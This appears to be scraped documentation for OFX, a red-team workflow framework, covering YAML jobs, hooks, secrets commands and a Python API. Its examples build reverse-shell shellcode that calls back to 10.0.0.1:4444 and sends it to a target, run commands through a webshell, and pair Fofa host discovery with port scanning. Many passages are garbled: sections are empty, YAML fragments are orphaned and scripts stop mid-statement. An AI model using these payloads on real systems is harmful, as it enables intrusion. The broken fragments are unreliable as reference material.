docs.title: What is OFX?
docs.text:
Offensive Flow Executor (OFX) is a powerful workflow execution framework designed specifically for red teaming operations. It combines:

  • Workflow orchestration with dependency management
  • Comprehensive hook system for lifecycle customization
  • Red teaming APIs that eliminate boilerplate code
  • Async execution for efficient parallel operations
  • Template support for dynamic configurations

docs.title: Workflow Orchestration
docs.text:
Execute multi-job workflows with dependencies and automatic execution ordering.

name: Reconnaissance Workflow
jobs:
  discovery:
    steps:
      - run: nmap -sV ${{ inputs.target }}

  analysis:
    needs: [discovery]
    steps:
      - run: python analyze.py

docs.title: Performance Optimization
docs.text: OFX includes several performance optimizations to ensure fast execution and efficient resource usage.

docs.title: Problem
docs.text: Template resolution was creating new dictionaries and compiling Jinja2 templates on every call.

docs.title: Solution
docs.text:
• SUPPORT_FUNCS caching: Dictionary created once, reused across all instances
  • Template compilation caching: Compiled Template objects stored and reused
  • Cache size limiting: Maximum 1,000 templates prevents memory bloat

docs.title: Performance Impact
docs.text:
Template resolution: 0.013ms per call
5,000 resolutions: 0.065s

docs.title: Problem
docs.text: Connector discovery performed filesystem scanning at module import time.

docs.title: Solution
docs.text:
• Discovery deferred until first get_connector() call
  • No I/O overhead for unused APIs

docs.title: Performance Impact
docs.text:
Module import (lazy): 0.002s
Module import (eager): 0.008s
Connector discovery: 0.006s (only when needed)

docs.title: Benchmarking
docs.text:
Run the included benchmark:

python benchmark_perf.py

docs.title: For Workflow Authors
docs.text:
1. Reuse templates: Identical template strings benefit from compilation caching
  2. Keep workflows concise: Fewer unique templates = better cache hit rate
  3. Use variables: ${{ variable }} templates are cached and fast

docs.title: For Developers
docs.text:
1. Don't disable caching: Performance gains are significant
  2. Monitor cache size: Consider if 1,000 template limit is appropriate
  3. Profile before optimizing: Use benchmark to measure changes

docs.title: Template Cache
docs.text:
• Maximum size: 1,000 compiled templates
  • Auto-clear: Cache cleared when limit reached
  • Typical usage: 10-50 unique templates per workflow
  • Memory per template: ~2-5KB

docs.title: SUPPORT_FUNCS Cache
docs.text:
• Size: ~15 function references
  • Memory: <1KB
  • Lifetime: Class-level (shared across instances)

docs.text:

docs.title: Reconnaissance Example
docs.text:
from ofx.api import Fofa, PortScanner

# Asset discovery
fofa = Fofa(user="email@example.com", token="your_token")
targets = fofa.search('app="Apache" && country="US"', pages=2)

# Port scanning
for target in targets['results'][:10]:
    scanner = PortScanner(target=target['ip'], ports='80,443,8080')
    open_ports = scanner.scan()
    print(f"{target['ip']}: {open_ports}")

docs.title: Exploitation Example
docs.text:
from ofx.api import RemoteTarget, PayloadBuilder

# Build payload
payload = PayloadBuilder.build_shellcode(
    arch='x64',
    platform='linux',
    payload_type='reverse_shell',
    lhost='10.0.0.1',
    lport=4444
)

# Send to target
with RemoteTarget(host='target.com', port=9999) as remote:
    remote.send(payload)
    response = remote.recv()

docs.title: API Usage in Workflows
docs.text:
All APIs can be used directly in your workflow steps:

name: api-example
description: Using OFX APIs in workflows

jobs:
  recon:
    steps:
      - name: Use HTTP API
        language: python
        script: |
          from ofx.api import http

          response = http.fetch("https://api.target.com")
          print(response)

      - name: Use WebShell API
        language: python
        script: |
          from ofx.api import webshell

          shell = webshell.WebShell(
              url="${{ inputs.shell_url }}",
              param="cmd"
          )
          result = shell.execute("whoami")
          print(result)

docs.title: Common API Patterns
docs.text:
HTTP Requests: 

from ofx.api import http

# GET request
response = http.fetch("https://api.example.com/data")

# POST request
data = http.post("https://api.example.com/submit", 
                 data={"key": "value"})

File Operations: 

from ofx.api import file

# Read file
content = file.read("results.txt")

# Write file
file.write("output.txt", "data")

# Check if exists
if file.exists("config.json"):
    config = file.read("config.json")

String Manipulation: 

from ofx.api import strings

# Encode/decode
encoded = strings.base64_encode("data")
decoded = strings.base64_decode(encoded)

# URL operations
encoded_url = strings.url_encode("param=value&test=1")

For complete API reference with parameters, return types, and examples, use: 

ofx docs api --module <module_name>

docs.title: flow / x / task
docs.text:
Manage and run workflows in the OFX system

Aliases: x, task - You can use ofx x run or ofx task run instead of ofx flow run

docs.title: flow run
docs.text:
Execute a workflow with optional inputs and outputs.

ofx flow run <workflow_name> [options]
ofx x run <workflow_name> [options]          # Using alias

Arguments: - workflow_name (required) - Name of the workflow to run

Options: - -i, --input <key=value> - Input parameters (can be specified multiple times) - -o, --output <path> - Output directory for results (default: current directory)

Examples:

# Run a simple workflow
ofx flow run port_scan

# Run with inputs
ofx flow run subdomain_enum --input domain=example.com

# Run with multiple inputs
ofx flow run api_scan \
  --input target=https://api.example.com \
  --input endpoints=/users,/admin,/api

# Specify output directory
ofx flow run comprehensive_scan \
  --input target=10.0.0.1 \
  --output ./results/scan-2024-12-25

docs.title: project init
docs.text:
Initialize a new Red Team project with optional remote storage and encryption.

ofx project init <name> [options]

Arguments: - name (required) - Project name

Options: - -m, --multiphase - Initialize a multi-phase project

docs.title: secret
docs.text:
Manage secrets for workflows

Secure encrypted storage for API keys, tokens, and sensitive data.

docs.title: secret set
docs.text:
Store a secret value in encrypted storage.

ofx secret set <name> [options]

Arguments: - name (required) - Secret name/identifier

Options: - -v, --value <value> - Secret value (if not provided, will prompt securely) - -f, --file <path> - Read secret value from file

Examples:

# Set secret interactively (hidden input)
ofx secret set API_KEY

# Set secret directly
ofx secret set DATABASE_URL --value "postgresql://user:pass@host/db"

# Set secret from file
ofx secret set SSH_PRIVATE_KEY --file ~/.ssh/id_rsa

# Set JSON secret
ofx secret set AWS_CREDENTIALS --value '{"access_key":"xxx","secret_key":"yyy"}'

docs.title: secret get
docs.text:
Retrieve a secret value.

ofx secret get <name> [options]

Arguments: - name (required) - Secret name

Options: - -s, --show - Display the secret value (otherwise just confirms existence)

Examples:

# Check if secret exists
ofx secret get API_KEY

# Show secret value
ofx secret get API_KEY --show

# Show JSON secret formatted
ofx secret get AWS_CREDENTIALS --show

docs.title: secret list
docs.text:

ofx secret list

docs.title: secret delete
docs.text:
Delete a secret from storage.

ofx secret delete <name> [options]

Arguments: - name (required) - Secret name to delete

Options: - -f, --force - Skip confirmation prompt

Examples:

# Delete with confirmation
ofx secret delete OLD_API_KEY

# Delete without confirmation
ofx secret delete TEMP_TOKEN --force

docs.title: secret export
docs.text:
Export secrets to a file for backup or migration.

ofx secret export [options]

Options: - -o, --output <path> - Output file path (default: secrets_backup.json) - --plain - Export without encryption (not recommended)

Description: Creates an encrypted backup of all secrets. Keep the backup file secure.

Examples:

# Export to default file
ofx secret export

# Export to specific file
ofx secret export --output /secure/backup.json

docs.title: secret import
docs.text:
Import secrets from a backup file.

ofx secret import <file> [options]

Arguments: - file (required) - Path to secrets backup file

Options: - --merge - Merge with existing secrets (default: replace) - -f, --force - Skip confirmation for overwrites

Description: Restores secrets from a backup file. By default, replaces all existing secrets.

Examples:

# Import and replace all secrets
ofx secret import secrets_backup.json

# Import and merge with existing
ofx secret import secrets_backup.json --merge

# Import without confirmation
ofx secret import secrets_backup.json --force

docs.title: secret clear
docs.text:
Clear all secrets from storage.

ofx secret clear [options]

Options: - -f, --force - Skip confirmation prompt

Description: Removes ALL secrets from encrypted storage. This action cannot be undone.

Examples:

# Clear all secrets with confirmation
ofx secret clear

# Clear without confirmation
ofx secret clear --force

docs.title: secret store
docs.text:

Examples:

docs.title: secret migrate
docs.text:
Migrate secrets between different storage formats or locations.

ofx secret migrate [options]

Options: - --from <format> - Source format (v1, v2, plain) - --to <format> - Target format (v2, v3)

Description: Upgrades secret storage format when OFX versions change.

Examples:

# Migrate to latest format
ofx secret migrate --from v1 --to v2

docs.title: dump schema
docs.text:
Display workflow schema information in formatted tables.

ofx dump schema [options]

Options: - --workflow - Show workflow-level properties only - --job - Show job-level properties only - --step - Show step-level properties only - --json - Output in JSON format

Description: Displays the complete workflow data model including all properties, types, defaults, and descriptions for workflow, job, and step objects.

docs.title: dump flow

Dump a specific workflow's configuration.

ofx dump flow <workflow_name> [options]

Arguments: - workflow_name (required) - Name of the workflow to dump

Options: - --json - Output in JSON format - --yaml - Output in YAML format (default)

Description: Shows the complete configuration of a workflow including all jobs, steps, hooks, inputs, and secrets.

Examples:

# Dump workflow configuration
ofx dump flow port_scan

# Dump as JSON
ofx dump flow port_scan --json

  --input target=production.example.com \
  --output ./results/prod/$(date +%Y%m%d)

docs.title: Environment Variables
docs.text:
OFX respects these environment variables:

  • OFX_CONFIG_DIR - Override default config directory (~/.config/ofx)
  • OFX_DATA_DIR - Override default data directory (~/.local/share/ofx)
  • OFX_WORKFLOW_DIRS - Additional workflow directories (colon-separated)
  • OFX_SECRETS_FILE - Custom secrets file location
  • OFX_LOG_LEVEL - Logging level (DEBUG, INFO, WARNING, ERROR)

Example:

export OFX_CONFIG_DIR=/opt/ofx/config
export OFX_LOG_LEVEL=DEBUG
ofx flow run my_workflow

docs.title: Using Aliases
docs.text:
Flow command has convenient aliases for faster typing:

ofx x run scan           # Instead of: ofx flow run scan
ofx task run enum        # Instead of: ofx flow run enum

docs.title: Command Chaining
docs.text:
Combine commands for complex workflows:

# Validate, install tools, then run
ofx flow validate scan && \
ofx flow tools scan && \
ofx x run scan --input target=example.com

# Run and backup results
ofx flow run assessment --output ./results && \
tar -czf results_$(date +%Y%m%d).tar.gz results/

# Export secrets before system migration
ofx secret export --output backup.json && \
ofx project sync --push

docs.title: Output Redirection
docs.text:
Capture command output for processing:

# Save workflow schema
ofx dump schema --json > schema.json

# Save workflow configuration
ofx dump flow recon --yaml > recon_backup.yml

# Export project list
ofx project list --json > projects.json

# Save secret list (names only, not values)
ofx secret list --json > secret_inventory.json

docs.title: Using with Other Tools
docs.text:
Integrate OFX with system tools:

# Run workflow and send notification
ofx flow run scan && notify-send "Scan Complete"

# Parallel workflow execution
parallel ofx flow run {} --input target=example.com ::: scan1 scan2 scan3

# Schedule workflows with cron
# Run every day at 2 AM
0 2 * * * cd /path/to/project && ofx x run daily_scan --output /results/$(date +\%Y\%m\%d)

# Monitor workflow in tmux/screen
tmux new-session -d -s ofx_scan 'ofx flow run long_scan'

docs.title: Configuration Management
docs.text:
Manage OFX configuration efficiently:

# Backup entire configuration
tar -czf ofx_backup_$(date +%Y%m%d).tar.gz ~/.config/ofx/

# Copy workflows to new system
rsync -av ~/.config/ofx/workflows/ newserver:~/.config/ofx/workflows/

# Version control workflows
cd ~/.config/ofx/workflows/
git init
git add *.yml
git commit -m "Initial workflows"

# Share workflows with team
git remote add origin https://github.com/team/ofx-workflows.git
git push -u origin main

docs.title: Exit Codes
docs.text:
OFX follows standard exit code conventions:

  • 0 - Success
  • 1 - General error
  • 2 - Command syntax error
  • 130 - Interrupted (Ctrl+C)

Example in scripts:

#!/bin/bash
if ofx flow validate my_workflow; then
    ofx flow run my_workflow --input target=$TARGET
else
    echo "Workflow validation failed"
    exit 1
fi

docs.title: Basic Concepts
docs.text: Understanding OFX core concepts helps you build powerful workflows efficiently.

docs.title: Workflow
docs.text: A workflow is the top-level container that defines a complete automation process.

docs.title: Structure
docs.text:
name: workflow-name
description: Workflow description

inputs:
  # Input parameters

secrets:
  # Required secrets

jobs:
  # Job definitions

hooks:
  # Lifecycle hooks

docs.title: Key Properties
docs.text:
• name - Unique identifier (required)
  • description - Human-readable description
  • inputs - User-provided parameters
  • secrets - Sensitive configuration
  • jobs - Execution units
  • hooks - Lifecycle callbacks

docs.title: Job
docs.text: A job is an independent unit of work within a workflow.

docs.title: Characteristics
docs.text:
• Jobs run sequentially by default
  • Can have dependencies (run after other jobs)
  • Contain steps that execute in order
  • Can define their own hooks and environment

docs.title: Example
docs.text:
jobs:
  recon:
    name: Reconnaissance
    steps:
      - name: Scan ports
        run: nmap -p- ${{ inputs.target }}

  exploit:
    name: Exploitation
    needs: [recon]  # Runs after recon
    steps:
      - name: Launch exploit
        run: python exploit.py

docs.title: Step
docs.text: A step is the smallest unit of execution within a job.

docs.title: Types of Steps
docs.text:
1. Shell Command (default) 

    - name: Run command
  run: echo "Hello"

  2. Python Script 

    - name: Python code
  language: python
  script: |
    print("Hello from Python")

  3. Bash Script 

    - name: Bash script
  language: bash
  script: |
    #!/bin/bash
    echo "Hello from Bash"

docs.title: Step Properties
docs.text:
• name - Step description
  • run - Shell command (for shell steps)
  • script - Code content (for script steps)
  • language - Script language (python, bash, etc.)
  • timeout - Maximum execution time
  • retry - Retry configuration
  • continue_on_error - Don't fail job on error

docs.title: Inputs
docs.text: Inputs are parameters passed to workflows at runtime.

docs.title: Definition
docs.text:
inputs:
  target:
    description: Target host or IP
    required: true
    default: "127.0.0.1"

  ports:
    description: Ports to scan
    required: false
    default: "80,443"

docs.title: Usage
docs.text:
In workflow: 

steps:
  - run: nmap -p ${{ inputs.ports }} ${{ inputs.target }}

From CLI: 

ofx flow run scan --input target=example.com --input ports=22,80,443

docs.title: Input Properties
docs.text:
• description - Help text
  • required - Must be provided
  • default - Fallback value
  • type - Data type (string, number, boolean)

docs.title: Secrets
docs.text: Secrets are encrypted sensitive data (API keys, passwords, tokens).

docs.title: Definition
docs.text:
secrets:
  api_key:
    description: API authentication key
    required: true

  password:
    description: Admin password
    required: false

docs.title: Usage
docs.text:
Store secret: 

ofx secret set API_KEY
# Enter value when prompted

In workflow: 

steps:
  - run: curl -H "Authorization: Bearer ${{ secrets.api_key }}"

docs.title: Secret Properties
docs.text:
• Stored in encrypted file (~/.config/ofx/secrets.enc)
  • Never logged or displayed
  • Automatically loaded from secret store
  • Can be provided via environment variables

docs.title: Hooks
docs.text: Hooks are callbacks that execute at specific lifecycle events.

docs.title: Hook Types
docs.text:
1. Status Hooks 

    hooks:
  on_start:
    - run: echo "Starting..."

  on_success:
    - run: echo "Success!"

  on_failure:
    - run: echo "Failed!"

  2. Lifecycle Hooks 

    hooks:
  before_jobs:
    - run: echo "Before jobs"

  after_jobs:
    - run: echo "After jobs"

  3. Command Hooks 

    hooks:
  before_command:
    - run: echo "Before each command"

  after_command:
    - run: echo "After each command"

docs.title: Hook Scopes
docs.text:
Hooks can be defined at:

  1. Workflow level - Affect entire workflow
  2. Job level - Affect specific job
  3. Step level - Affect specific step

docs.title: Hook Propagation
docs.text:
Hooks propagate from parent to child:

Workflow hooks
    ↓
Job hooks (inherit + add)
    ↓
Step hooks (inherit + add)

Example: 

hooks:
  on_start:
    - run: echo "Workflow start"  # Runs once

jobs:
  job1:
    hooks:
      on_start:
        - run: echo "Job1 start"  # Runs at job start
    steps:
      - name: Step 1
        run: echo "Doing work"

See Hooks Guide for more details.

docs.title: Templates
docs.text: Templates enable dynamic configuration using Jinja2 syntax.

docs.title: Template Syntax
docs.text: ${{ expression }}

docs.title: Available Variables
docs.text:
1. inputs - User inputs 

    ${{ inputs.target }}

  2. secrets - Secret values 

    ${{ secrets.api_key }}

  3. ctx - Context variables 

    ${{ ctx.workflow.name }}
${{ ctx.job.name }}
${{ ctx.step.name }}

docs.title: Built-in Functions
docs.text:
Tool Installation: 

- run: ${{ uv_install('requests') }}
- run: ${{ pip_install('numpy') }}
- run: ${{ go_install('github.com/projectdiscovery/subfinder') }}
- run: ${{ npm_install('wappalyzer') }}

Path Operations: 

- run: ${{ output_path('results.txt') }}
- run: ${{ workflow_path() }}

docs.title: Template Examples
docs.text:
Conditional execution: 

steps:
  - name: Debug mode
    run: |
      {% if inputs.debug %}
      echo "Debug enabled"
      {% endif %}

Loops: 

steps:
  - name: Scan multiple targets
    run: |
      {% for target in inputs.targets.split(',') %}
      nmap {{ target }}
      {% endfor %}

See Templates Guide for more details.

docs.title: Template Resolution
docs.text:
Templates are resolved before execution in this order:

  1. Workflow level - Inputs, secrets loaded
  2. Job level - Job context available
  3. Step level - Full context available

Example:

inputs:
  target: "example.com"

jobs:
  scan:
    envs:
      TARGET: ${{ inputs.target }}  # Resolved to "example.com"
    steps:
      - name: Scan
        run: nmap $TARGET  # Uses resolved env var

docs.title: Dependencies
docs.text: Jobs can depend on other jobs using needs:

docs.title: Simple Dependency
docs.text:
jobs:
  job1:
    steps:
      - run: echo "First"

  job2:
    needs: [job1]  # Waits for job1
    steps:
      - run: echo "Second"

docs.title: Multiple Dependencies
docs.text:
jobs:
  recon:
    steps:
      - run: echo "Recon"

  scan:
    steps:
      - run: echo "Scan"

  analyze:
    needs: [recon, scan]  # Waits for both
    steps:
      - run: echo "Analyze"

docs.title: Execution Flow
docs.text:
recon ─┐
       ├─→ analyze
scan ──┘

Jobs recon and scan run in parallel (if possible), then analyze runs.

docs.title: Environment Variables
docs.text: Define environment variables at different levels:

docs.title: Workflow Level
docs.text:
envs:
  GLOBAL_VAR: "value"

jobs:
  job1:
    steps:
      - run: echo $GLOBAL_VAR  # Available

docs.title: Job Level
docs.text:
jobs:
  job1:
    envs:
      JOB_VAR: "value"
    steps:
      - run: echo $JOB_VAR  # Available

docs.title: Step Level
docs.text:
steps:
  - name: With env
    envs:
      STEP_VAR: "value"
    run: echo $STEP_VAR

docs.title: Error Handling
docs.text: Control error behavior at different levels:

docs.title: Continue on Error
docs.text:
jobs:
  resilient:
    continue_on_error: true  # Job continues even if step fails
    steps:
      - run: false  # Fails but job continues
      - run: echo "Still runs"

docs.title: Retry Configuration
docs.text:
steps:
  - name: Flaky command
    retry:
      max_attempts: 3
      delay: 5  # seconds
    run: curl https://api.example.com

docs.title: Timeout
docs.text:
steps:
  - name: Long task
    timeout: 300  # 5 minutes
    run: long-running-command

docs.title: Output Management
docs.text: Control where outputs are saved:

docs.title: Output Directory
docs.text:
# Set at workflow level
output_dir: "./results"

jobs:
  scan:
    steps:
      - run: nmap -oN output.txt ${{ inputs.target }}
        # Saves to ./results/output.txt

docs.title: Custom Output Path
docs.text:
# From CLI
ofx flow run scan --output /tmp/scan-results

docs.title: Accessing Outputs
docs.text:
steps:
  - name: Save results
    run: echo "Results" > ${{ output_path('data.txt') }}

  - name: Read results
    run: cat ${{ output_path('data.txt') }}

docs.title: Context Variables
docs.text: Access runtime information via ctx:

docs.title: Workflow Context
docs.text:
${{ ctx.workflow.name }}        # Workflow name
${{ ctx.workflow.description }} # Description

docs.title: Job Context
docs.text:
${{ ctx.job.name }}             # Current job name
${{ ctx.job.id }}               # Job ID

docs.title: Step Context
docs.text:
${{ ctx.step.name }}            # Current step name
${{ ctx.step.index }}           # Step number

docs.title: System Context
docs.text:
${{ ctx.system.os }}            # Operating system
${{ ctx.system.arch }}          # Architecture
${{ ctx.system.user }}          # Current user

docs.title: 1. Use Descriptive Names
docs.text:
Good: 

name: comprehensive-web-app-security-scan
jobs:
  subdomain-enumeration:
    steps:
      - name: Run subfinder for subdomain discovery

Bad: 

name: scan
jobs:
  job1:
    steps:
      - name: step1

    description: Target domain (e.g., example.com)
    required: true

    default: 300

  on_success:

jobs:

    steps:

steps:
  - name: Optional step
    continue_on_error: true
    run: experimental-tool

  - name: Critical step
    retry:
      max_attempts: 3
    run: important-command

name: webshell-demo

docs.title: Multi-Job Workflows
docs.text:
Create recon.yml with dependencies:

name: basic-recon
description: Basic reconnaissance workflow

inputs:
  domain:
    description: Target domain
    required: true

jobs:
  subdomain-enum:
    name: Enumerate Subdomains
    steps:
      - name: Run subfinder
        run: |
          subfinder -d ${{ inputs.domain }} -o subdomains.txt
          cat subdomains.txt

  port-scan:
    name: Scan Discovered Hosts
    needs: [subdomain-enum]
    steps:
      - name: Run nmap
        run: |
          nmap -iL subdomains.txt -p 80,443,8080 -oN nmap-results.txt

    name: Analyze Results
    needs: [subdomain-enum, port-scan]
    steps:
      - name: Summary
        run: |
          echo "=== Reconnaissance Summary ==="
          echo "Subdomains found: $(wc -l < subdomains.txt)"
          echo "Nmap results:"
          cat nmap-results.txt

Run:

ofx flow run basic-recon --input domain=example.com

Jobs execute in order: subdomain-enum → port-scan → analyze

docs.title: Hooks System
docs.text: The hook system allows you to execute custom code at various lifecycle points during workflow, job, and step execution. Hooks propagate conditionally through the execution hierarchy.

docs.title: Lifecycle Hooks
docs.text:
Execute at specific points in the execution lifecycle:

  • before_init - Before initialization
  • on_init - During initialization
  • on_start - When execution starts
  • on_iter - On each iteration (for loops)
  • on_end - When execution ends
  • before_run - Before running
  • after_run - After running

docs.title: Status Hooks
docs.text:
Execute based on execution status:

  • on_success - When execution succeeds
  • on_failure - When execution fails
  • on_error - When an error occurs
  • on_cancel - When execution is cancelled

docs.title: Command Hooks
docs.text:
Execute during command execution:

  • on_cmd - Before command execution
  • on_cmd_done - After command completion
  • on_line - For each line of output

docs.title: Hook Structure
docs.text:
hooks:
  hook_name:
    script: "script content"
    language: python|shell|bash

docs.title: Single-line Hook
docs.text:
hooks:
  on_start:
    script: echo "Starting execution"
    language: shell

docs.title: Multi-line Hook
docs.text:
hooks:
  on_success:
    script: |
      import datetime
      print(f"Completed at {datetime.now()}")
      print(f"Duration: {ctx.duration} seconds")
    language: python

docs.title: Hook Propagation
docs.text: Hooks propagate conditionally through the hierarchy: Step → Job → Workflow

docs.title: Propagation Rules
docs.text:
1. Step with hooks: Step hooks execute, then propagate to Job, then Workflow
  2. Step without hooks: Job hooks execute, then propagate to Workflow
  3. Job without hooks: Only Workflow hooks execute

docs.title: Example
docs.text:
name: Hook Propagation Example

hooks:
  on_start:
    script: echo "Workflow started"  # Executes for all
    language: shell

jobs:
  job1:
    hooks:
      on_start:
        script: echo "Job1 started"  # Executes + propagates to workflow
        language: shell
    steps:
      - name: Step with hook
        run: echo "Hello"
        hooks:
          on_start:
            script: echo "Step started"  # Executes + propagates to job + workflow
            language: shell

      - name: Step without hook
        run: echo "World"
        # Job hook executes + propagates to workflow

Execution order for first step: 1. Step's on_start hook 2. Job's on_start hook (propagated) 3. Workflow's on_start hook (propagated) 4. Step executes 5. Hooks in reverse for on_end

docs.title: Workflow-Level Hooks
docs.text:
Apply to the entire workflow:

name: My Workflow

hooks:
  on_start:
    script: |
      print("=== Workflow Starting ===")
      print(f"Target: {ctx.inputs['target']}")
      print(f"Run ID: {ctx.run_id}")
    language: python

  on_success:
    script: python notify.py --status success --target ${{ inputs.target }}
    language: shell

  on_error:
    script: |
      import sys
      print(f"ERROR: {error}", file=sys.stderr)
      # Send alert
      import requests
      requests.post('https://alerts.example.com', json={'error': str(error)})
    language: python

jobs:
  # ... job definitions

docs.title: Job-Level Hooks
docs.text:
Apply to specific jobs:

jobs:
  critical_scan:
    hooks:
      on_start:
        script: echo "Starting critical scan - alerting team"
        language: shell

      on_failure:
        script: python alert_team.py --severity high --job critical_scan
        language: shell

      on_success:
        script: python log_success.py --job critical_scan
        language: shell

    steps:
      - name: Scan
        run: nmap -sV ${{ inputs.target }}

docs.title: Step-Level Hooks
docs.text:
Apply to individual steps:

steps:
  - name: Critical operation
    run: python critical.py
    hooks:
      on_start:
        script: echo "Starting critical operation at $(date)"
        language: shell

      on_cmd:
        script: |
          print(f"Executing command: {command}")
          print(f"Working directory: {os.getcwd()}")
        language: python

      on_line:
        script: |
          # Process each line of output
          print(f"OUTPUT: {line.strip()}")
        language: python

      on_success:
        script: echo "Critical operation succeeded"
        language: shell

      on_error:
        script: |
          print(f"CRITICAL ERROR: {error}")
          # Emergency notification
        language: python

docs.title: Available Context in Hooks

hooks:
  before_run:
    script: |
      import os
      import sys

      # Check required tools
      tools = ['nmap', 'curl', 'python3']
      for tool in tools:
        if os.system(f'which {tool} > /dev/null 2>&1') != 0:
          print(f"ERROR: Required tool '{tool}' not found")
          sys.exit(1)

      # Check network connectivity
      if os.system('ping -c 1 8.8.8.8 > /dev/null 2>&1') != 0:
        print("ERROR: No network connectivity")
        sys.exit(1)

      print("✓ All pre-flight checks passed")

    script: python notify.py --status success

hooks:
  on_error:
    script: |
      try:
        # Attempt notification
        send_alert(error)
      except Exception as e:

  on_start:
    script: echo "Starting at $(date)"
    language: shell

# Python for complex logic

  on_end:
    script: |
      import json
      from datetime import datetime

      report = {
        'completed_at': datetime.now().isoformat(),
        'duration': ctx.duration,
        'status': 'success'

hooks:
  on_start:
    # This hook validates the target is reachable before starting
    # If validation fails, the workflow will not execute
    script: |
      import socket
      try:
        socket.gethostbyname('${{ inputs.target }}')

# Good - on_line just observes
hooks:
  on_line:
    script: |
      if 'ERROR' in line:
        print(f"Warning: Error detected in output")
    language: python

# Bad - on_line modifies state
hooks:
  on_line:
    script: |
      # Don't do this - race conditions!
      with open('output.txt', 'a') as f:

    language: python

name: Multi-Stage Deployment

hooks:
  on_start:
    script: python deployment_started.py --stage ${{ inputs.stage }}
    language: shell

  on_error:
    script: |
      import sys
      print(f"DEPLOYMENT FAILED AT STAGE: {ctx.current_job}")
      # Rollback logic
      rollback_deployment(ctx.current_job)
      sys.exit(1)
    language: python

jobs:
  validate:
    hooks:
      on_success:
        script: echo "✓ Validation passed"
        language: shell
    steps:
      - run: python validate_config.py

  deploy_stage:
    needs: [validate]
    hooks:
      on_start:
        script: python pre_deploy_checks.py
        language: shell
      on_success:
        script: python post_deploy_verify.py
        language: shell
    steps:
      - run: kubectl apply -f deployment.yml

  smoke_test:
    needs: [deploy_stage]
    hooks:
      on_failure:
        script: |
          print("Smoke tests failed - initiating rollback")
          rollback()
        language: python
    steps:
      - run: python smoke_tests.py

docs.title: Jobs & Steps
docs.text: Jobs are logical groupings of steps that execute sequentially. Steps are the smallest unit of execution, running individual commands or scripts.

docs.title: Basic Job Structure
docs.text:
jobs:
  job_name:
    description: Optional job description
    steps:
      - name: Step 1
        run: echo "Hello"

      - name: Step 2
        run: echo "World"

docs.title: name (key)
docs.text:
The job identifier used for dependencies.

jobs:
  reconnaissance:  # This is the name
    steps: [...]

docs.title: description (optional)
docs.text:
Human-readable job description.

jobs:
  scan:
    description: "Performs comprehensive port and service scanning"
    steps: [...]

docs.title: needs (optional)
docs.text:
List of jobs that must complete before this job runs.

jobs:
  scan:
    steps: [...]

  analyze:
    needs: [scan]  # Waits for scan job
    steps: [...]

  report:
    needs: [scan, analyze]  # Waits for both
    steps: [...]

docs.title: continue_on_error (optional)
docs.text:
Continue workflow execution even if this job fails.

jobs:
  optional_check:
    continue_on_error: true
    steps:
      - run: some_command_that_might_fail

docs.title: envs (optional)
docs.text:
Environment variables specific to this job.

jobs:
  build:
    envs:
      CC: gcc
      CFLAGS: -O2
    steps:
      - run: make build

docs.title: hooks (optional)
docs.text:
Job-specific lifecycle hooks.

jobs:
  deploy:
    hooks:
      on_start:
        script: echo "Starting deployment"
        language: shell
      on_success:
        script: python notify.py --status success
        language: shell
    steps: [...]

docs.title: Basic Step Structure
docs.text:
steps:
  - name: Step name
    run: command to execute

  - name: Another step
    script: |
      #!/bin/bash
      echo "Multi-line script"
      echo "Line 2"
    language: shell

docs.title: name (required)
docs.text:
Human-readable step name.

- name: "Scan target for open ports"
  run: nmap ${{ inputs.target }}

docs.title: run (option 1)
docs.text:
Single-line command to execute.

- name: List files
  run: ls -la /tmp

docs.title: script (option 2)
docs.text:
Multi-line script to execute.

- name: Complex operation
  script: |
    #!/bin/bash
    for port in 80 443 8080; do
      nc -zv ${{ inputs.target }} $port
    done
  language: shell

docs.title: language (required with script)
docs.text:
Script language: shell, python, bash, sh.

- name: Python script
  script: |
    import os
    print(f"Running in {os.getcwd()}")
  language: python

docs.title: working_dir (optional)
docs.text:
Working directory for command execution.

- name: Build project
  run: make build
  working_dir: /tmp/project

docs.title: envs (optional)
docs.text:
Environment variables for this step.

- name: Compile with specific flags
  run: gcc main.c -o app
  envs:
    CFLAGS: -O3 -Wall
    LDFLAGS: -lpthread

docs.title: timeout (optional)
docs.text:
Maximum execution time in seconds.

- name: Long running scan
  run: nmap -p- ${{ inputs.target }}
  timeout: 3600  # 1 hour

docs.title: retry (optional)
docs.text:
Number of retry attempts on failure.

- name: API call with retry
  run: curl https://api.example.com
  retry: 3
  retry_delay: 5  # seconds between retries

docs.title: continue_on_error (optional)
docs.text:
Continue to next step even if this step fails.

- name: Optional cleanup
  run: rm -f /tmp/cache
  continue_on_error: true

docs.title: Input Validation
docs.text:
Validate inputs before execution:

jobs:
  validate:
    steps:
      - name: Validate target
        script: |
          import re
          import sys

          target = '${{ inputs.target }}'

          # Check format
          if not re.match(r'^[a-zA-Z0-9.-]+$', target):
            print(f"Invalid target format: {target}")
            sys.exit(1)

          print(f"✓ Valid target: {target}")
        language: python

      - name: Validate ports
        script: |
          import sys

          ports = '${{ inputs.ports }}'

          # Check port range
          for port in ports.split(','):
            try:
              p = int(port.strip())
              if p < 1 or p > 65535:
                raise ValueError
            except:
              print(f"Invalid port: {port}")
              sys.exit(1)

          print(f"✓ Valid ports: {ports}")
        language: python

name: Comprehensive Scan

inputs:
  target:
    description: "Target hostname or IP address to scan"
    required: true

  ports:
    description: "Ports to scan (e.g., 80,443 or 1-1000)"
    required: false
    default: "1-1000"

    required: false

jobs:

    steps:

        script: |
          speed_map = {
            'slow': '-T2',
            'normal': '-T3',
            'fast': '-T4',
            'aggressive': '-T5'
          }

          speed_flag = speed_map.get('${{ inputs.scan_speed }}', '-T3')
          format_flag = '-o${{ inputs.output_format }}'.upper()

          print(f"Speed: {speed_flag}")
          print(f"Format: {format_flag}")
        language: python

      - name: Run scan
        run: |
          nmap ${{ inputs.target }} \
            -p ${{ inputs.ports }} \
            -T3 \
            -o${{ inputs.output_format }} ${{ ctx.output_path }}/scan.${{ inputs.output_format }}

docs.text:
name: Multi-Service Integration

secrets:
  SHODAN_API_KEY:
    description: "Shodan API key"
    required: false

  CENSYS_API_ID:
    description: "Censys API ID"
    required: false

  CENSYS_API_SECRET:
    description: "Censys API secret"
    required: false

  SLACK_WEBHOOK:
    description: "Slack webhook URL for notifications"
    required: false

jobs:
  passive_recon:
    steps:
      - name: Query Shodan
        script: |
          import requests

          api_key = '${{ secrets.SHODAN_API_KEY }}'
          if not api_key:
            print("Shodan API key not provided, skipping")
            sys.exit(0)

          target = '${{ inputs.target }}'
          response = requests.get(
            f'https://api.shodan.io/shodan/host/{target}',
            params={'key': api_key}
          )

          print(response.json())
        language: python

